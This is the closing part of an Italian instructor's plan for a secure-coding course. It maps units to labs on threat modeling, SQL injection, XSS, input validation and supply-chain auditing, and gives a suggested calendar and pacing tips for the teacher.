| **UF 7** | "Tecniche di redazione documentazione tecnica" → L7 Template SECURITY.md |
| **UF 9** | "Progettazione" → L2 Threat Modeling + STRIDE |
| **UF 10** | "Scrittura del software" → L3-L6 tutti i lab |
| **UF 11** | "Sviluppo del software" → cookie, DB → L4 |
| **UF 12** | "Testing" → test pytest in L3 (estensione possibile) |
| **UF 13** | "Manutenzione" → patching, pip-audit → L6 |
| **Stage** | Template SECURITY.md compilato sul progetto di stage |

---

## Calendario suggerito

Distribuzione su **4 settimane × 2 lezioni di 2h**:

| Settimana | Lezioni | Argomenti chiave |
|-----------|---------|-------------------|
| 1 | L1 + L2 | Fondamenti + OWASP/STRIDE |
| 2 | L3 + L4 | SQLi + IDOR/bcrypt |
| 3 | L5 + L6 | XSS/header + validation/supply chain |
| 4 | L7 + L8 | Documentazione/AI + verifica finale |

Adattabile a:
- **8 settimane** × 1 lezione (più diluito)
- **2 settimane** × 4 lezioni (più intensivo)
- **2 giorni** × 8h (workshop bootcamp — sconsigliato per discenti junior)

---

## Note finali per il docente

### Cosa fare se rimani indietro

- **L3 in ritardo**: salta lo Step 4 del lab SQLi ("perché filtrare non basta") — rimanda alla Checklist
- **L5 in ritardo**: copri solo XSS Reflected, lascia Stored e DOM-based come letture
- **L6 in ritardo**: salta path traversal (è secondario), tieni Pydantic + pip-audit

### Cosa fare se vai avanti

- Aggiungi un cenno di **CSRF** in L5 (cookie SameSite c'è già)
- Aggiungi 30 min di **JWT vs cookie session** in L4
- Distribuisci i **materiali EXTRA** del repo 32h come letture facoltative

### Feedback raccolto dopo ogni edizione

Compila una nota dopo ogni lezione:
- Cosa è andato bene
- Cosa è stato faticoso per gli allievi
- Cosa cambierei la prossima volta

Aggiorna questo piano a ogni edizione.

---

> *Piano predisposto per il corso STEM IFTS — Anno formativo 2024/2025*
> *Versione 1.0 — Maggio 2026*
> *Autore: Ing. Alessandro Manneschi*
